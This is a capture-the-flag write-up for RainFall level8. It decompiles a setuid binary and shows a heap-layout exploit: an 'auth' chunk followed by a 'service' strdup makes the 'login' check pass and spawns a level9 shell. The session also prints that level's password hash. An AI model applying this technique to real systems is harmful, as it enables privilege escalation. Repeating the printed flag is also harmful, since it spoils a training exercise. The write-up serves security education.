# level8

This one is a weirdo. I will spare you from the output of the disassembly and use `IDA Pro`. `Ghidra` is outputting a mess because of the x86 strings instruction. `IDA Pro` does a nice job of replacing them by `memcmp` and `strlen` for readability, even if the `CMPS` and `SCAS` instruction are used instead.

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[5]; // [esp+20h] [ebp-88h] BYREF
  char v5[2]; // [esp+25h] [ebp-83h] BYREF
  char v6[129]; // [esp+27h] [ebp-81h] BYREF

  while ( 1 )
  {
    printf("%p, %p \n", auth, (const void *)service);
    if ( !fgets(s, 128, stdin) )
      break;
    if ( !memcmp(s, "auth ", 5u) )
    {
      auth = (char *)malloc(4u);
      *(_DWORD *)auth = 0;
      if ( strlen(v5) <= 0x1E )
        strcpy(auth, v5);
    }
    if ( !memcmp(s, "reset", 5u) )
      free(auth);
    if ( !memcmp(s, "service", 6u) )
      service = (int)strdup(v6);
    if ( !memcmp(s, "login", 5u) )
    {
      if ( *((_DWORD *)auth + 8) )
        system("/bin/sh");
      else
        fwrite("Password:\n", 1u, 0xAu, stdout);
    }
  }
  return 0;
}
```

Our goal appears to be writing at the address contained by the global variable **auth**, offseted by 32 bytes. If there is some data there, we have access to our shell.

## auth

This code is crippled with vulnerabilities. The first one is an **heap-buffer overflow** :

```c
auth = (char *)malloc(4u);
*(_DWORD *)auth = 0;
if ( strlen(v5) <= 0x1E )
    strcpy(auth, v5);
```

Allocating a buffer of 4 bytes, and then proceed to copy at most 30 bytes from the user input. If we attempt to fill this buffer more than 13 bytes, using the `reset` will trigger an abort because we corrupted `malloc` internal block structure :

```
level8@RainFall:~$ ./level8 
(nil), (nil) 
auth AAAAAAAAAAAAAA
0x804a008, (nil) 
reset
*** glibc detected *** ./level8: free(): invalid next size (fast): 0x0804a008 ***
======= Backtrace: =========
/lib/i386-linux-gnu/libc.so.6(+0x74f82)[0xb7ea0f82]
./level8[0x8048678]
/lib/i386-linux-gnu/libc.so.6(__libc_start_main+0xf3)[0xb7e454d3]
./level8[0x80484d1]
======= Memory map: ========
08048000-08049000 r-xp 00000000 00:10 8117       /home/user/level8/level8
08049000-0804a000 rwxp 00000000 00:10 8117       /home/user/level8/level8
0804a000-0806b000 rwxp 00000000 00:00 0          [heap]
b7e07000-b7e23000 r-xp 00000000 07:00 17889      /lib/i386-linux-gnu/libgcc_s.so.1
b7e23000-b7e24000 r-xp 0001b000 07:00 17889      /lib/i386-linux-gnu/libgcc_s.so.1
b7e24000-b7e25000 rwxp 0001c000 07:00 17889      /lib/i386-linux-gnu/libgcc_s.so.1
b7e2b000-b7e2c000 rwxp 00000000 00:00 0 
b7e2c000-b7fcf000 r-xp 00000000 07:00 17904      /lib/i386-linux-gnu/libc-2.15.so
b7fcf000-b7fd1000 r-xp 001a3000 07:00 17904      /lib/i386-linux-gnu/libc-2.15.so
b7fd1000-b7fd2000 rwxp 001a5000 07:00 17904      /lib/i386-linux-gnu/libc-2.15.so
b7fd2000-b7fd5000 rwxp 00000000 00:00 0 
b7fd8000-b7fdd000 rwxp 00000000 00:00 0 
b7fdd000-b7fde000 r-xp 00000000 00:00 0          [vdso]
b7fde000-b7ffe000 r-xp 00000000 07:00 17933      /lib/i386-linux-gnu/ld-2.15.so
b7ffe000-b7fff000 r-xp 0001f000 07:00 17933      /lib/i386-linux-gnu/ld-2.15.so
b7fff000-b8000000 rwxp 00020000 07:00 17933      /lib/i386-linux-gnu/ld-2.15.so
bffdf000-c0000000 rwxp 00000000 00:00 0          [stack]
Aborted (core dumped)
```

Nothing really crusty here to get access to our shell.

# service

Service is using `strdup` on the user input. If used directly after an `auth` command, `malloc` (used by `strdup`) will allocate a block just 16 bytes after auth.

```
level8@RainFall:~$ ./level8 
(nil), (nil) 
auth PPPP
0x804a008, (nil) 
service PPPPP
0x804a008, 0x804a018 
```

# login

The conditional `if ( *((_DWORD *)auth + 8) )` becomes : if the address `0x804a008 + 0x20` contains a non-zero value. We can see that `service` is allocated at `0x804a018`. By filling the buffer pointed by `service`, this condition becomes true.

```
level8@RainFall:~$ ./level8 
(nil), (nil) 
auth PPPP
0x804a008, (nil) 
service PPPPP
0x804a008, 0x804a018 
^C
level8@RainFall:~$ ./level8 
(nil), (nil) 
auth AAAA
0x804a008, (nil) 
service PPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPP
0x804a008, 0x804a018 
login
$ whoami
level9
$ cd ../level9
$ cat .pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
$ 
0x804a008, 0x804a018 
```

This one was easy !